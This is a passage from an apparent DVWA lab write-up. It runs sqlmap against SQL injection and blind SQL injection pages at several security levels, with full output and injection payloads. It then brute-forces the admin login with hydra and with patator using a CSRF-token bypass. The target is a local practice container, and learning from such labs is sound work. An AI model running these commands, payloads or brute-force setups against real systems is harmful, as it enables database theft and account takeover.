web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:12:41] [INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema

```

\*Not all the steps performed in the previous difficulty have been repeated since it is understood that having succeeded in executing this one, all the others would be a mere repetition.
#### High

Now every time we want to perform a query, a pop-up window appears to enter the parameter, this window has the following URL `http://172.17.0.2/vulnerabilities/sqli/session-input.php` associated to it.

As it was evident the tool is totally prepared for this, the command to execute is the following one: `sqlmap -u "http://172.17.0.2/vulnerabilities/sqli/session-input.php" --cookie "PHPSESSID=albq3dhv4vof90l6l89q8qa1s0;security=high" --data="id=1&Submit&Submit" --second-url "http://172.17.0.2/vulnerabilities/sqli" --batch -dbs`

\*The output is not attached because it is exactly the same as the previous one.
### BlindSQLi

This attack vector is **exactly** the same as the previous one except for one small thing, the errors are not shown explicitly, this does not hinder the launching of the attack, however it does slow down the execution of the attack considerably.
#### Easy

The command to be used is exactly the same as in the previous attack vector (at the corresponding difficulty).

`sqlmap -u "http://172.17.0.2/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=albq3dhv4vof90l6l89q8qa1s0;security=low" --batch -dbs`

The output obtained:

```txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:38:31 /2023-12-02/

[13:38:31] [INFO] testing connection to the target URL
[13:38:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:38:31] [INFO] testing if the target URL content is stable
[13:38:32] [INFO] target URL content is stable
[13:38:32] [INFO] testing if GET parameter 'id' is dynamic
[13:38:32] [WARNING] GET parameter 'id' does not appear to be dynamic
[13:38:32] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:38:32] [INFO] testing for SQL injection on GET parameter 'id'
[13:38:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:38:32] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[13:38:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:38:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:38:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:38:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:38:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:38:32] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:38:32] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:38:32] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:38:32] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:38:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:38:32] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:38:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:38:32] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:38:32] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:38:32] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:38:32] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:38:32] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[13:38:32] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:38:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:38:32] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:38:32] [INFO] testing 'Generic inline queries'
[13:38:32] [INFO] testing 'MySQL inline queries'
[13:38:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:38:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:38:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:38:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:38:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:38:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:38:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:38:43] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:38:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:38:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:38:43] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:38:43] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:38:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:38:43] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:38:43] [INFO] testing 'MySQL UNION query (76) - 1 to 20 columns'
[13:38:43] [INFO] testing 'MySQL UNION query (76) - 21 to 40 columns'
[13:38:43] [INFO] testing 'MySQL UNION query (76) - 41 to 60 columns'
[13:38:43] [INFO] testing 'MySQL UNION query (76) - 61 to 80 columns'
[13:38:44] [INFO] testing 'MySQL UNION query (76) - 81 to 100 columns'
[13:38:44] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 235 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1382=1382 AND 'qSey'='qSey&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5161 FROM (SELECT(SLEEP(5)))FOIE) AND 'xQlA'='xQlA&Submit=Submit
---
[13:38:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:38:44] [INFO] fetching database names
[13:38:44] [INFO] fetching number of databases
[13:38:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:38:44] [INFO] retrieved: 2
[13:38:44] [INFO] retrieved: dvwa
[13:38:44] [INFO] retrieved: information_schema
available databases [2]:
[*] dvwa
[*] information_schema
```

\*As it has happened previously with this command it is demonstrated that if you want it is possible to execute the whole series of steps proposed in the first example, however to save irrelevant repetitions we save these extra steps.
#### Normal

Again we perform the same process of the previous attack in the equivalent difficulty.

```txt
POST /vulnerabilities/sqli_blind/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.17.0.2/vulnerabilities/sqli_blind/
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://172.17.0.2
DNT: 1
Connection: close
Cookie: PHPSESSID=albq3dhv4vof90l6l89q8qa1s0; security=medium
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit% 
```

Again the command to execute is `sqlmap -r a -dbs`

```txt
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:41:08 /2023-12-02/

[13:41:08] [INFO] parsing HTTP request from 'a'
[13:41:08] [INFO] resuming back-end DBMS 'mysql' 
[13:41:08] [INFO] testing connection to the target URL
[13:41:08] [INFO] testing if the target URL content is stable
[13:41:08] [INFO] target URL content is stable
[13:41:08] [INFO] testing if POST parameter 'id' is dynamic
[13:41:09] [WARNING] POST parameter 'id' does not appear to be dynamic
[13:41:09] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
[13:41:09] [INFO] testing for SQL injection on POST parameter 'id'
[13:41:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:41:09] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User ID exists in the database.")
[13:41:09] [INFO] testing 'Generic inline queries'
[13:41:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:41:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:41:09] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)                                                                         
[13:41:19] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[13:41:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:41:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:41:25] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:41:25] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[13:41:29] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:41:29] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[13:41:30] [INFO] checking if the injection point on POST parameter 'id' is a false positive
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5484=5484&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3420 FROM (SELECT(SLEEP(5)))iTte)&Submit=Submit
---
[13:41:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:41:31] [INFO] fetching database names
[13:41:31] [INFO] fetching number of databases
[13:41:31] [INFO] resumed: 2
[13:41:31] [INFO] resumed: dvwa
[13:41:31] [INFO] resumed: information_schema
available databases [2]:
[*] dvwa
[*] information_schema
```

#### High

If we intercept the POST request containing the id we can see that the request has a new cookie associated with it, so we add this one to the command of the corresponding difficulty from the previous attack `sqlmap -u "http://172.17.0.2/vulnerabilities/sqli_blind/cookie-input.php" --cookie "id=1;PHPSESSID=albq3dhv4vof90l6l89q8qa1s0;security=high" --data="id=1&Submit&Submit" --second-url "http://172.17.0.2/vulnerabilities/sqli_blind" --batch -dbs`

```txt
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:47:55 /2023-12-02/

[13:47:55] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
got a 301 redirect to 'http://172.17.0.2/vulnerabilities/sqli_blind/'. Do you want to follow? [Y/n] Y
[13:47:55] [INFO] testing if the target URL content is stable
[13:47:56] [WARNING] POST parameter 'id' does not appear to be dynamic
[13:47:56] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
[13:47:56] [INFO] testing for SQL injection on POST parameter 'id'
[13:47:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:47:56] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User ID exists in the database.")
[13:48:08] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:48:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:48:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:48:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:48:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:48:12] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:48:12] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:48:12] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:48:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:48:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:48:15] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:48:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:48:15] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:48:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:48:17] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:48:17] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:48:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:48:17] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:48:17] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:48:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:48:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:48:17] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[13:48:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:48:17] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:48:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:48:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:48:17] [INFO] testing 'Generic inline queries'
[13:48:17] [INFO] testing 'MySQL inline queries'
[13:48:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:48:17] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[13:48:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:48:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:48:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:48:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:48:24] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[13:48:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[13:48:35] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[13:48:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[13:48:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[13:49:20] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' injectable 
[13:49:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:49:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:49:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:49:24] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:49:25] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:49:39] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:49:39] [INFO] testing 'MySQL UNION query (94) - 1 to 20 columns'
[13:49:51] [INFO] testing 'MySQL UNION query (94) - 21 to 40 columns'
[13:49:52] [INFO] testing 'MySQL UNION query (94) - 41 to 60 columns'
[13:50:03] [INFO] testing 'MySQL UNION query (94) - 61 to 80 columns'
[13:50:14] [INFO] testing 'MySQL UNION query (94) - 81 to 100 columns'
[13:50:22] [INFO] checking if the injection point on POST parameter 'id' is a false positive
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 239 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5244=5244 AND 'jrCW'='jrCW&Submit&Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: id=1' OR SLEEP(5)#&Submit&Submit
---
[13:50:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:50:22] [INFO] fetching database names
[13:50:22] [INFO] fetching number of databases
[13:50:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:50:22] [INFO] retrieved: 2
[13:50:22] [INFO] retrieved: dvwa
[13:50:27] [INFO] retrieved: information_schema
available databases [2]:
[*] dvwa
[*] information_schema
```

### Brute Force

The so-called brute force attack consists of producing what is defined in MITRE as `Unauthorized access` specifically on the account of a user, for this purpose a dictionary attack is performed (trying all the predefined passwords in a dictionary).

The Burpsuite, Hydra and Patator tools will be used for this attack.

It is worth mentioning the honorable mention of the crunch tool which can be used to generate these password dictionaries, however it has not been necessary to use it since both Kali and Parrot have a series of wordlists (dictionaries) in the `/usr/share/wordlists` folder.
#### Low

As usual we start by intercepting a request with Burpsuite (it has already been explained several times how to do it...).

```txt
GET /vulnerabilities/brute/?username=admin&password=123&Login=Login HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.17.0.2/vulnerabilities/brute/?username=a&password=z&Login=Login
DNT: 1
Connection: close
Cookie: PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=low
Upgrade-Insecure-Requests: 1

```

For the sake of simplicity we assume that the user whose access we need to breach is `admin`.
Now we are going to use a tool that performs the brute force automatically, it is worth mentioning that Burpsuite has an option that would also serve for this purpose more specifically is located in the Intruder tab.

In this case for simplicity we have chosen the tool par excellence for brute force attacks `hydra`, the command to execute is the following: `hydra -l admin -P /usr/share/wordlists/fasttrack.txt -v 172.17.0.2 http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=low:Username and/or password incorrect."`

The output is as follows:

```txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-29 12:18:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking http-get-form://172.17.0.2:80/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=low:Username and/or password incorrect.
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-get-form] host: 172.17.0.2   login: admin   password: password
[STATUS] attack finished for 172.17.0.2 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-29 12:18:58
                                                                                       
```

#### Normal

Again we try the previous command, surprisingly this time **yes** it works, we just notice a considerable increase of the execution time, to alleviate this we add more threads to the command by means of the `-t` flag. The complete command is the following :` hydra -l admin -P /usr/share/wordlists/fasttrack.txt -v 172.17.0.2 -t 64 http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=medium:Username and/or password incorrect."`

Its corresponding output:

```txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-29 12:22:30
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking http-get-form://172.17.0.2:80/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=medium:Username and/or password incorrect.
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 93.00 tries/min, 93 tries in 00:01h, 129 to do in 00:02h, 64 active
[STATUS] 61.50 tries/min, 123 tries in 00:02h, 99 to do in 00:02h, 64 active
[80][http-get-form] host: 172.17.0.2   login: admin   password: password
[STATUS] attack finished for 172.17.0.2 (waiting for children to complete tests)
[STATUS] 74.00 tries/min, 222 tries in 00:03h, 1 to do in 00:01h, 39 active
[STATUS] 55.50 tries/min, 222 tries in 00:04h, 1 to do in 00:01h, 9 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-29 12:26:58

```
#### Hard

Again we test our luck by repeating the previous procedure, this time without success. Again we check the web and Burpsuite.

After more than one attempt on the web we can find the error `CSRF token is incorrect`.
From Burpsuite the request is as follows:

```txt
GET /vulnerabilities/brute/index.php?username=a&password=z&Login=Login&user_token=8c1cdf2695e483dd4f1363daca9af007 HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://172.17.0.2/vulnerabilities/brute/index.php
Cookie: PHPSESSID=lil7dlgeij03e1p484m90hl8m6; security=high
Upgrade-Insecure-Requests: 1

```
Inside the request we find a new parameter in the URL, which is a CSRF token which apparently changes on each access attempt, this forces us to modify our modus operandi.

We could choose to write a custom script but since it is very likely that someone has already encountered such a problem we tried to find a tool which is able to solve it (since hydra is not :D).

After some research, we found the tool [Patator](https://github.com/lanjelot/patator.git).
After reading the brief documentation we only need to execute the following commands:

```bash
SESSIONID=lil7dlgeij03e1p484m90hl8m6
git clone https://github.com/lanjelot/patator.git
cd patator
./patator.py http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=5 --max-retries=0 \
  url="http://172.17.0.2/vulnerabilities/brute/?username=admin&password=FILE0&user_token=_CSRF_&Login=Login" \
  0=/usr/share/wordlists/fasttrack.txt \
  header="Cookie: security=high; PHPSESSID=${SESSIONID}" \
  before_urls="http://172.17.0.2/vulnerabilities/brute/" \
  before_header="Cookie: security=high; PHPSESSID=${SESSIONID}" \
  before_egrep="_CSRF_:<input type='hidden' name='user_token' value='(\w+)' />" \
  -x quit:fgrep!='Username and/or password incorrect'
```

The output of the last command is as follows:

```txt
14:15:56 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.11.6 at 2023-12-29 14:15 CET
14:15:56 patator    INFO -                                                                              
14:15:56 patator    INFO - code size:clen       time | candidate                          |   num | mesg
14:15:56 patator    INFO - -----------------------------------------------------------------------------
14:15:58 patator    INFO - 200  4735:4463      2.003 | Spring2017                         |     1 | HTTP/1.1 200 OK
14:16:01 patator    INFO - 200  4735:4463      3.004 | Spring2016                         |     2 | HTTP/1.1 200 OK
14:16:01 patator    INFO - 200  4735:4463      0.003 | Spring2015                         |     3 | HTTP/1.1 200 OK
14:16:04 patator    INFO - 200  4735:4463      3.002 | Spring2014                         |     4 | HTTP/1.1 200 OK
14:16:05 patator    INFO - 200  4735:4463      1.003 | Spring2013                         |     5 | HTTP/1.1 200 OK
14:16:05 patator    INFO - 200  4735:4463      0.003 | spring2017                         |     6 | HTTP/1.1 200 OK
14:16:05 patator    INFO - 200  4735:4463      0.001 | spring2016                         |     7 | HTTP/1.1 200 OK
14:16:08 patator    INFO - 200  4735:4463      3.001 | spring2015                         |     8 | HTTP/1.1 200 OK
14:16:11 patator    INFO - 200  4735:4463      3.004 | spring2014                         |     9 | HTTP/1.1 200 OK
14:16:11 patator    INFO - 200  4735:4463      0.004 | spring2013                         |    10 | HTTP/1.1 200 OK
14:16:13 patator    INFO - 200  4735:4463      2.003 | Summer2017                         |    11 | HTTP/1.1 200 OK
14:16:15 patator    INFO - 200  4735:4463      2.004 | Summer2016                         |    12 | HTTP/1.1 200 OK
14:16:17 patator    INFO - 200  4735:4463      2.004 | Summer2015                         |    13 | HTTP/1.1 200 OK
14:16:17 patator    INFO - 200  4735:4463      0.004 | Summer2014                         |    14 | HTTP/1.1 200 OK
14:16:17 patator    INFO - 200  4735:4463      0.004 | Summer2013                         |    15 | HTTP/1.1 200 OK
